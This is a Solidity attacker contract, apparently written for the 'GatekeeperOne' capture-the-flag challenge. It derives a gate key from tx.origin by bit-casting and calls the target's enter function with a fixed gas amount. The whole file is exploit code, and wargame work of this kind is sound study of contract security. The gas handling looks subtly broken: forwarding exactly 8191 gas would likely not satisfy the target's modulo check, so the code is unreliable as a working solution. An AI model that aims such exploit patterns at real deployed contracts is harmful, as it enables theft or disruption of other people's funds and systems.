pragma solidity ^0.8.0;

contract GatekeeperOneAttacker {
    address immutable public instance;
    bytes8 public gateKey;

    constructor(address _instance) {
        instance = _instance;
        uint160 txOriginBytes = uint160(tx.origin);
        uint16 lower16 = uint16(txOriginBytes);
        uint32 lower32 = lower16;
        uint32 upper32 = 0x00000001;
        uint64 combined64 = (uint64(upper32) << 32) | lower32;
        gateKey = bytes8(combined64);
    }

    function attack() public {
        (bool success, ) = address(instance).call{gas: 8191}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        require(success, "Call failed");
    }
}